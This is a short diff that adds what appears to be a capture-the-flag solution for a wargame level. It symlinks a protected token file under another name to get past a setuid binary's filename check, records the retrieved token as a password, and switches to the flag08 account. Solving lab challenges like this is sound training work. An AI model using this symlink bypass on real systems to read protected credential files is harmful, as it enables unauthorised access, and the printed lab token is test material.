@@ -1,0 +1,6 @@
+mkdir /tmp/mdr
+cd /tmp/mdr
+ln -s ~/token lol
+~/level08 /tmp/mdr/lol
+give: quif5eloekouj29ke0vouxean
+su flag08
